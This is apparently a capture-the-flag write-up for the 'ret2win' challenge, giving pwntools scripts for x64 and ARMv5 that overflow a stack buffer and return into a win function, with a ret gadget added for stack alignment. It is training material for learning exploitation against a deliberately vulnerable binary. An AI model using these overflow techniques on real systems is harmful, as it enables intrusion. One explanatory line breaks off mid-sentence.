## x64
---
- Classic `ret2win` challenge but it opens the flag with a syscall to `system(/bin/cat flag.txt)` and by default the stack doesn't end up being aligned so we need to preface it with a `ret` gadget
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./ret2win"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

offset = 40

rop = ROP(elf)
rop.raw(rop.ret.address)
rop.raw(elf.sym.ret2win)

payload = flat({offset: rop.chain()})

context.log_level = "debug"
io = gdb.debug(exe, "b ret2win\nc")
io.sendafter(b"> ", payload)
io.interactive()
```

## ARMv5
---
- Just use `cyclic` to find the offset and overflow the stored 
```python
#!/usr/bin/env python3

from pwn import *

exe = "./ret2win_armv5"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

offset = 36
payload = flat({offset: p64(elf.sym.ret2win)})

io = gdb.debug(exe)
io.sendafter(b"> ", payload)
io.interactive()
```
